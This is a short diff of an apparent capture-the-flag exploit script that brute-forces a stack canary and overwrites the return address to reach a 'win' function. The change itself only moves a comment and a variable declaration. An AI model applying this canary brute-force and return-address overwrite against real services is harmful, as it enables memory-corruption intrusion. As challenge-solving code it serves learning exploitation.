@@ -47,6 +47,8 @@ def connect(can_val: bytes, can_offset: int, printBool = False):
 buf_offset = int("68", 16)
 can_offset = buf_offset - int("10", 16)
 win_location = b"\x87"
+# Loop to find the second half of the second byte, last half is 0 (for me, get it from ghidra)
+i = bytearray(b"\x00")
 
 # Iterates over the canary to brute force the value
 can_val = b"\x00" + b"\x00"
@@ -67,8 +69,6 @@ while True:
     else: 
         print("Idk tbh")
 
-# The loop is to find the second half of the second byte, last half is 0 (for men, get it from ghidra)
-i = bytearray(b"\x00")
 for j in range(15):
     payload = can_val + b'B'*8 + win_location + i
     connect(payload, can_offset, printBool=True)
